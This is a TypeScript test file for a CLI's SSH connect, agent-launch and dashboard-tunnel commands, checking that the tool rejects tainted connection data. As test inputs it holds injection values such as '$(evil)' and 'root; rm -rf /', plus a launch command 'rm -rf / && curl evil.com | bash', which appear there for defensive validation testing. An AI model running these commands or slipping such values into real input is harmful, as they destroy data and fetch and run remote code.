/**
 * cmd-connect-cov.test.ts — Coverage tests for commands/connect.ts
 *
 * Tests: cmdConnect, cmdEnterAgent, cmdOpenDashboard
 */

import type { VMConnection } from "../history";
import type { Manifest } from "../manifest";

import { afterEach, beforeEach, describe, expect, it, mock, spyOn } from "bun:test";
import { createMockManifest, mockClackPrompts } from "./test-helpers";

// ── Clack prompts mock ──────────────────────────────────────────────────────
const clack = mockClackPrompts();

// ── Mock ssh modules via spyOn after dynamic import ─────────────────────────
const sshModule = await import("../shared/ssh.js");
const sshKeysModule = await import("../shared/ssh-keys.js");
const uiModule = await import("../shared/ui.js");

const { cmdConnect, cmdEnterAgent, cmdOpenDashboard } = await import("../commands/connect.js");

// ── Helpers ────────────────────────────────────────────────────────────────

const mockManifest = createMockManifest();

function makeConn(overrides: Partial<VMConnection> = {}): VMConnection {
  return {
    ip: "1.2.3.4",
    user: "root",
    server_name: "spawn-abc",
    server_id: "12345",
    cloud: "hetzner",
    ...overrides,
  };
}

// ── Test setup ──────────────────────────────────────────────────────────────

describe("cmdConnect", () => {
  let processExitSpy: ReturnType<typeof spyOn>;
  let spawnInteractiveSpy: ReturnType<typeof spyOn>;
  let ensureSshKeysSpy: ReturnType<typeof spyOn>;
  let getSshKeyOptsSpy: ReturnType<typeof spyOn>;

  beforeEach(() => {
    clack.logError.mockReset();
    clack.logInfo.mockReset();
    clack.logStep.mockReset();

    processExitSpy = spyOn(process, "exit").mockImplementation((_code?: number): never => {
      throw new Error(`process.exit(${_code})`);
    });

    spawnInteractiveSpy = spyOn(sshModule, "spawnInteractive").mockReturnValue(0);
    ensureSshKeysSpy = spyOn(sshKeysModule, "ensureSshKeys").mockResolvedValue([]);
    getSshKeyOptsSpy = spyOn(sshKeysModule, "getSshKeyOpts").mockReturnValue([]);
  });

  afterEach(() => {
    processExitSpy.mockRestore();
    spawnInteractiveSpy.mockRestore();
    ensureSshKeysSpy.mockRestore();
    getSshKeyOptsSpy.mockRestore();
  });

  it("connects via SSH to a valid connection", async () => {
    const conn = makeConn();
    await cmdConnect(conn);

    expect(spawnInteractiveSpy).toHaveBeenCalled();
    const args = spawnInteractiveSpy.mock.calls[0][0];
    expect(args).toContain("ssh");
    expect(args.some((a: string) => a.includes("root@1.2.3.4"))).toBe(true);
  });

  it("connects via sprite console for sprite-console IP", async () => {
    const conn = makeConn({
      ip: "sprite-console",
      server_name: "my-sprite",
    });
    await cmdConnect(conn);

    expect(spawnInteractiveSpy).toHaveBeenCalled();
    const args = spawnInteractiveSpy.mock.calls[0][0];
    expect(args[0]).toBe("sprite");
    expect(args).toContain("console");
    expect(args).toContain("my-sprite");
  });

  it("exits on security validation failure (bad IP)", async () => {
    const conn = makeConn({
      ip: "$(evil)",
    });
    await expect(cmdConnect(conn)).rejects.toThrow("process.exit");
    expect(processExitSpy).toHaveBeenCalledWith(1);
    expect(clack.logError).toHaveBeenCalledWith(expect.stringContaining("Security validation"));
  });

  it("exits on security validation failure (bad user)", async () => {
    const conn = makeConn({
      user: "root; rm -rf /",
    });
    await expect(cmdConnect(conn)).rejects.toThrow("process.exit");
    expect(processExitSpy).toHaveBeenCalledWith(1);
  });

  it("exits on security validation failure (bad server_name)", async () => {
    const conn = makeConn({
      server_name: "$(inject)",
    });
    await expect(cmdConnect(conn)).rejects.toThrow("process.exit");
    expect(processExitSpy).toHaveBeenCalledWith(1);
  });

  it("exits on security validation failure (bad server_id)", async () => {
    const conn = makeConn({
      server_id: "$(inject)",
    });
    await expect(cmdConnect(conn)).rejects.toThrow("process.exit");
    expect(processExitSpy).toHaveBeenCalledWith(1);
  });

  it("throws when SSH exits with non-zero code", async () => {
    spawnInteractiveSpy.mockReturnValue(1);
    const conn = makeConn();
    await expect(cmdConnect(conn)).rejects.toThrow("SSH connection failed");
  });

  it("handles spawnInteractive throwing an error", async () => {
    spawnInteractiveSpy.mockImplementation(() => {
      throw new Error("spawn failed");
    });
    const conn = makeConn();
    await expect(cmdConnect(conn)).rejects.toThrow("spawn failed");
    expect(clack.logError).toHaveBeenCalledWith(expect.stringContaining("Failed to connect"));
  });
});

describe("cmdEnterAgent", () => {
  let processExitSpy: ReturnType<typeof spyOn>;
  let spawnInteractiveSpy: ReturnType<typeof spyOn>;
  let ensureSshKeysSpy: ReturnType<typeof spyOn>;
  let getSshKeyOptsSpy: ReturnType<typeof spyOn>;
  let startSshTunnelSpy: ReturnType<typeof spyOn>;
  let openBrowserSpy: ReturnType<typeof spyOn>;

  beforeEach(() => {
    clack.logError.mockReset();
    clack.logInfo.mockReset();
    clack.logStep.mockReset();

    processExitSpy = spyOn(process, "exit").mockImplementation((_code?: number): never => {
      throw new Error(`process.exit(${_code})`);
    });

    spawnInteractiveSpy = spyOn(sshModule, "spawnInteractive").mockReturnValue(0);
    ensureSshKeysSpy = spyOn(sshKeysModule, "ensureSshKeys").mockResolvedValue([]);
    getSshKeyOptsSpy = spyOn(sshKeysModule, "getSshKeyOpts").mockReturnValue([]);
    startSshTunnelSpy = spyOn(sshModule, "startSshTunnel").mockResolvedValue({
      localPort: 8080,
      stop: mock(() => {}),
    });
    openBrowserSpy = spyOn(uiModule, "openBrowser").mockImplementation(() => {});
  });

  afterEach(() => {
    processExitSpy.mockRestore();
    spawnInteractiveSpy.mockRestore();
    ensureSshKeysSpy.mockRestore();
    getSshKeyOptsSpy.mockRestore();
    startSshTunnelSpy.mockRestore();
    openBrowserSpy.mockRestore();
  });

  it("enters agent via SSH with stored launch_cmd", async () => {
    const conn = makeConn({
      launch_cmd: "source ~/.spawnrc; claude",
    });
    await cmdEnterAgent(conn, "claude", mockManifest);

    expect(spawnInteractiveSpy).toHaveBeenCalled();
    const args = spawnInteractiveSpy.mock.calls[0][0];
    expect(args.some((a: string) => a.includes("root@1.2.3.4"))).toBe(true);
  });

  it("builds remote command from manifest when no launch_cmd stored", async () => {
    const conn = makeConn();
    await cmdEnterAgent(conn, "claude", mockManifest);

    expect(spawnInteractiveSpy).toHaveBeenCalled();
  });

  it("exits on security validation failure", async () => {
    const conn = makeConn({
      ip: "$(evil)",
    });
    await expect(cmdEnterAgent(conn, "claude", mockManifest)).rejects.toThrow("process.exit");
    expect(processExitSpy).toHaveBeenCalledWith(1);
  });

  it("exits on security validation failure for bad launch_cmd", async () => {
    const conn = makeConn({
      launch_cmd: "rm -rf / && curl evil.com | bash",
    });
    await expect(cmdEnterAgent(conn, "claude", mockManifest)).rejects.toThrow("process.exit");
    expect(processExitSpy).toHaveBeenCalledWith(1);
  });

  it("enters agent via sprite exec -tty", async () => {
    const conn = makeConn({
      ip: "sprite-console",
      server_name: "my-sprite",
    });
    await cmdEnterAgent(conn, "claude", mockManifest);

    expect(spawnInteractiveSpy).toHaveBeenCalled();
    const args = spawnInteractiveSpy.mock.calls[0][0];
    expect(args[0]).toBe("sprite");
    expect(args).toContain("exec");
    expect(args).toContain("-tty");
    expect(args).toContain("my-sprite");
  });

  it("uses agent key as fallback when manifest is null", async () => {
    const conn = makeConn();
    await cmdEnterAgent(conn, "claude", null);

    expect(spawnInteractiveSpy).toHaveBeenCalled();
  });

  it("establishes SSH tunnel when tunnel metadata is present", async () => {
    const conn = makeConn({
      metadata: {
        tunnel_remote_port: "3000",
        tunnel_browser_url_template: "http://localhost:__PORT__",
      },
    });
    await cmdEnterAgent(conn, "claude", mockManifest);

    expect(startSshTunnelSpy).toHaveBeenCalled();
    expect(openBrowserSpy).toHaveBeenCalledWith("http://localhost:8080");
  });

  it("continues when tunnel fails", async () => {
    const err = Object.assign(new Error("tunnel failed"), {
      code: "ECONNREFUSED",
    });
    startSshTunnelSpy.mockRejectedValue(err);
    const conn = makeConn({
      metadata: {
        tunnel_remote_port: "3000",
      },
    });
    // Should not throw
    await cmdEnterAgent(conn, "claude", mockManifest);
    expect(spawnInteractiveSpy).toHaveBeenCalled();
  });

  it("exits on tunnel validation failure (bad port)", async () => {
    const conn = makeConn({
      metadata: {
        tunnel_remote_port: "$(inject)",
      },
    });
    await expect(cmdEnterAgent(conn, "claude", mockManifest)).rejects.toThrow("process.exit");
    expect(processExitSpy).toHaveBeenCalledWith(1);
  });

  it("handles pre_launch command from manifest", async () => {
    const manifest: Manifest = {
      ...mockManifest,
      agents: {
        ...mockManifest.agents,
        claude: {
          ...mockManifest.agents.claude,
          pre_launch: "nohup dashboard &",
        },
      },
    };
    const conn = makeConn();
    await cmdEnterAgent(conn, "claude", manifest);

    expect(spawnInteractiveSpy).toHaveBeenCalled();
  });

  it("stops tunnel handle after SSH session ends", async () => {
    const stopFn = mock(() => {});
    startSshTunnelSpy.mockResolvedValue({
      localPort: 8080,
      stop: stopFn,
    });

    const conn = makeConn({
      metadata: {
        tunnel_remote_port: "3000",
      },
    });
    await cmdEnterAgent(conn, "claude", mockManifest);

    expect(stopFn).toHaveBeenCalled();
  });
});

describe("cmdOpenDashboard", () => {
  let ensureSshKeysSpy: ReturnType<typeof spyOn>;
  let getSshKeyOptsSpy: ReturnType<typeof spyOn>;
  let startSshTunnelSpy: ReturnType<typeof spyOn>;
  let openBrowserSpy: ReturnType<typeof spyOn>;

  beforeEach(() => {
    clack.logError.mockReset();
    clack.logInfo.mockReset();
    clack.logStep.mockReset();
    clack.logSuccess.mockReset();

    ensureSshKeysSpy = spyOn(sshKeysModule, "ensureSshKeys").mockResolvedValue([]);
    getSshKeyOptsSpy = spyOn(sshKeysModule, "getSshKeyOpts").mockReturnValue([]);
    startSshTunnelSpy = spyOn(sshModule, "startSshTunnel").mockResolvedValue({
      localPort: 9090,
      stop: mock(() => {}),
    });
    openBrowserSpy = spyOn(uiModule, "openBrowser").mockImplementation(() => {});
  });

  afterEach(() => {
    ensureSshKeysSpy.mockRestore();
    getSshKeyOptsSpy.mockRestore();
    startSshTunnelSpy.mockRestore();
    openBrowserSpy.mockRestore();
  });

  it("returns early on validation failure", async () => {
    const conn = makeConn({
      ip: "$(evil)",
    });
    await cmdOpenDashboard(conn);
    expect(clack.logError).toHaveBeenCalledWith(expect.stringContaining("Security validation"));
  });

  it("returns early when no tunnel info", async () => {
    const conn = makeConn({
      metadata: undefined,
    });
    await cmdOpenDashboard(conn);
    expect(clack.logError).toHaveBeenCalledWith(expect.stringContaining("No dashboard tunnel info"));
  });

  it("returns early on tunnel validation failure", async () => {
    const conn = makeConn({
      metadata: {
        tunnel_remote_port: "$(inject)",
      },
    });
    await cmdOpenDashboard(conn);
    expect(clack.logError).toHaveBeenCalledWith(expect.stringContaining("Security validation"));
  });

  it("returns early when tunnel fails to open", async () => {
    const err = Object.assign(new Error("tunnel failed"), {
      code: "ECONNREFUSED",
    });
    startSshTunnelSpy.mockRejectedValue(err);
    const conn = makeConn({
      metadata: {
        tunnel_remote_port: "3000",
      },
    });
    await cmdOpenDashboard(conn);
    expect(clack.logError).toHaveBeenCalledWith(expect.stringContaining("Failed to open SSH tunnel"));
  });

  it("opens browser with URL template when provided", async () => {
    // Mock stdin for the "Press Enter" prompt
    const stdinSetRawMode = process.stdin.setRawMode;
    process.stdin.setRawMode = mock(() => process.stdin);
    const stdinResume = spyOn(process.stdin, "resume").mockImplementation(() => process.stdin);
    const stdinOnce = spyOn(process.stdin, "once").mockImplementation(
      (_event: string, cb: (...args: never) => unknown) => {
        // Immediately trigger the callback to simulate pressing Enter
        cb();
        return process.stdin;
      },
    );

    const conn = makeConn({
      metadata: {
        tunnel_remote_port: "3000",
        tunnel_browser_url_template: "http://localhost:__PORT__/dashboard",
      },
    });
    await cmdOpenDashboard(conn);

    expect(openBrowserSpy).toHaveBeenCalledWith("http://localhost:9090/dashboard");
    expect(clack.logSuccess).toHaveBeenCalledWith(expect.stringContaining("Dashboard opened"));

    process.stdin.setRawMode = stdinSetRawMode;
    stdinResume.mockRestore();
    stdinOnce.mockRestore();
  });

  it("shows port when no URL template", async () => {
    const stdinSetRawMode = process.stdin.setRawMode;
    process.stdin.setRawMode = mock(() => process.stdin);
    const stdinResume = spyOn(process.stdin, "resume").mockImplementation(() => process.stdin);
    const stdinOnce = spyOn(process.stdin, "once").mockImplementation(
      (_event: string, cb: (...args: never) => unknown) => {
        cb();
        return process.stdin;
      },
    );

    const conn = makeConn({
      metadata: {
        tunnel_remote_port: "3000",
      },
    });
    await cmdOpenDashboard(conn);

    expect(openBrowserSpy).not.toHaveBeenCalled();
    expect(clack.logSuccess).toHaveBeenCalledWith(expect.stringContaining("localhost:9090"));

    process.stdin.setRawMode = stdinSetRawMode;
    stdinResume.mockRestore();
    stdinOnce.mockRestore();
  });
});
